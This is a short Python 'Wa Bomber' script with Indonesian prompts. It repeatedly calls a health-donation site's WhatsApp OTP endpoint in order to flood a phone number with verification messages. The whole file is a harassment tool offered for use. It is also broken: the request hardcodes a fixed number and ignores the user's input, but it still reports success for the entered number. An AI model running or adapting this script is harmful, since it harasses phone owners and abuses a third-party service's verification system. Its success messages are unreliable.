import requests as r

banner = """
                        _______
                        [       ] 
                        | 0   0 | 
                      //|   °   |\\
                     $  [__###__]  $
                        | |   | |
                        ---   ---
                      ({Wa Bomber})
"""
print (banner)
num = input('Masukan Nomor Tanpa 62/0 : ')
jum = int(input('Jumlah :'))
for i in range(jum):
    req = r.get('https://passport.pedulisehat.id/v2/sms/captcha?mobile=85299187816&mobile_country_code=62&channel=WhatsApp&image_key=codeimage1591219736481511819&image_code=456780&_=1591219689654')
    if req.status_code == 200:
       print('Succes Sent To :' +num)
    else:
       print('Gagal Mengirim')
